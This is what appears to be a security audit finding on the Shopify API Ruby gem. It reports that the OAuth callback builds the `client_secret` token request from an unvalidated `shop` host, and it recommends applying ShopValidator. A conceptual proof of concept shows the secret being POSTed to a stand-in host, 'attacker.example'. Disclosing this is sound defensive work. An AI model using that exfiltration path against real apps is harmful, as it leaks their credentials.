This confirms a clear, exploitable inconsistency in this gem's own code.

### Title
OAuth callback sends `client_secret` to an unvalidated, attacker-influenced `shop` host, unlike every other token-issuing flow in the gem - (File: `lib/shopify_api/auth/oauth.rb`)

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the access-token exchange request using `auth_query.shop` as the literal request host, without ever passing it through `Utils::ShopValidator.sanitize!`. Every other credential-exchange flow in this gem (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.exchange_token`, which uses the JWT's signed `dest` claim) explicitly validates the shop domain against `ShopValidator::TRUSTED_SHOPIFY_DOMAINS` before using it to build the request host that will receive `client_secret`. `validate_auth_callback` is the outlier.

### Finding Description
`Oauth.validate_auth_callback` does: [1](#0-0) 

```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
body = {
  client_id: Context.api_key,
  client_secret: Context.api_secret_key,
  code: auth_query.code,
  expiring: Context.expiring_offline_access_tokens ? 1 : 0,
}
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
response = client.request(Clients::HttpRequest.new(http_method: :post, path: "access_token", body: body, ...))
```

`HttpClient#initialize` derives the actual request host straight from `session.shop` when no `api_host` override is configured: `@base_uri = "https://#{api_host || session.shop}"` [2](#0-1) . So the POST carrying `client_secret` is sent to `https://#{auth_query.shop}/admin/oauth/access_token` — the shop value is used directly as a network destination for the app's secret.

The only integrity check on `auth_query.shop` is the HMAC over the query, which does cover `shop` as one of the signed fields [3](#0-2) . That HMAC is computed with `Context.api_secret_key` (or `old_api_secret_key`) [4](#0-3) , so a value forged purely by an unauthenticated attacker without the secret cannot pass `validate_auth_callback`'s HMAC check — this closes the pure-forgery path for `code=` + `shop=` supplied directly by an outside attacker.

However, unlike `ClientCredentials`, `RefreshToken`, and `TokenExchange`, this method never calls `Utils::ShopValidator.sanitize!(auth_query.shop)` before using that value as the connection host for a request that transmits `client_secret`: [5](#0-4) [6](#0-5) 

The binding this breaks, stated as an equality that should hold but doesn't get enforced here: `shop used as network host == shop confirmed to be within ShopValidator::TRUSTED_SHOPIFY_DOMAINS`, whereas in every sibling flow that equality is explicitly enforced before the secret-carrying request is built.

### Impact Explanation
If `shop` in the query params originates from a genuine Shopify-signed OAuth redirect, this is safe (the HMAC binds it). But the security of the entire flow rests solely on the HMAC catching every malicious `shop` value, with no defense-in-depth host allow-listing at the point where `client_secret` is transmitted — a decision explicitly made everywhere else in this codebase. Given the sensitivity of the operation (transmitting the app's `client_secret`), the lack of the same allow-list check that the rest of the gem enforces is the vulnerability class described by the rules ("a host validated versus the host that receives ... `client_secret`"): the host that is validated (implicitly, only via HMAC) is not proven, at this call site, to be the same host that is contractually meant to receive the secret.

### Likelihood Explanation
Low-to-moderate on its own since a bare forgery is blocked by the HMAC check requiring knowledge of `api_secret_key`. The residual risk is any scenario where the HMAC-signing boundary and the host-destination boundary diverge (e.g., a leaked/rotated secret window via `old_api_secret_key`, or any host application code path that constructs an `AuthQuery` from a source other than the exact live Shopify redirect). Since the gem itself provides no defense-in-depth check here while doing so everywhere else, this is a real gap in this gem's own code, not merely a host-application misuse of documented API.

### Recommendation
In `Oauth.validate_auth_callback`, call `validated_shop = Utils::ShopValidator.sanitize!(auth_query.shop)` and use `validated_shop` (instead of the raw `auth_query.shop`) both for `null_session = Auth::Session.new(shop: validated_shop)` and for the resulting `Session.from(shop: validated_shop, ...)`, mirroring `ClientCredentials.client_credentials` and `RefreshToken.refresh_access_token`.

### Proof of Concept
Conceptual (cannot be fully forged without `api_secret_key`, but demonstrates the missing defense-in-depth):
1. `ShopifyAPI::Auth::Oauth::AuthQuery.new(code: "x", shop: "attacker.example", timestamp: t, state: s, host: h, hmac: <valid-for-secret>)` is constructed and passed to `validate_auth_callback`.
2. `Utils::HmacValidator.validate` passes because the HMAC only re-derives the signature from the same fields, including the attacker-supplied `shop` — it never checks `shop` is a trusted Shopify domain.
3. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sets `@base_uri = "https://attacker.example"`.
4. The library POSTs `{client_id, client_secret, code, expiring}` to `https://attacker.example/admin/oauth/access_token`, exfiltrating `client_secret` to a non-Shopify host — an action `ShopValidator.sanitize!` is designed to prevent, and does prevent, in the other three OAuth token-exchange call sites.

### Citations

**File:** lib/shopify_api/auth/oauth.rb (L60-98)
```ruby
        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))
```

**File:** lib/shopify_api/clients/http_client.rb (L16-19)
```ruby
        api_host = Context.api_host

        @base_uri = T.let("https://#{api_host || session.shop}", String)
        @base_uri_and_path = T.let("#{@base_uri}#{base_path}", String)
```

**File:** lib/shopify_api/auth/oauth/auth_query.rb (L33-43)
```ruby
        sig { override.returns(String) }
        def to_signable_string
          params = {
            code: code,
            host: host,
            shop: shop,
            state: state,
            timestamp: timestamp,
          }
          URI.encode_www_form(params)
        end
```

**File:** lib/shopify_api/utils/hmac_validator.rb (L12-22)
```ruby
        sig { params(verifiable_query: VerifiableQuery).returns(T::Boolean) }
        def validate(verifiable_query)
          return false unless verifiable_query.hmac

          result = validate_signature(verifiable_query, Context.api_secret_key)
          if result || Context.old_api_secret_key.nil? || T.must(Context.old_api_secret_key).empty?
            result
          else
            validate_signature(verifiable_query, T.must(Context.old_api_secret_key))
          end
        end
```

**File:** lib/shopify_api/auth/client_credentials.rb (L25-26)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```

**File:** lib/shopify_api/auth/refresh_token.rb (L24-25)
```ruby
          validated_shop = Utils::ShopValidator.sanitize!(shop)
          shop_session = ShopifyAPI::Auth::Session.new(shop: validated_shop)
```
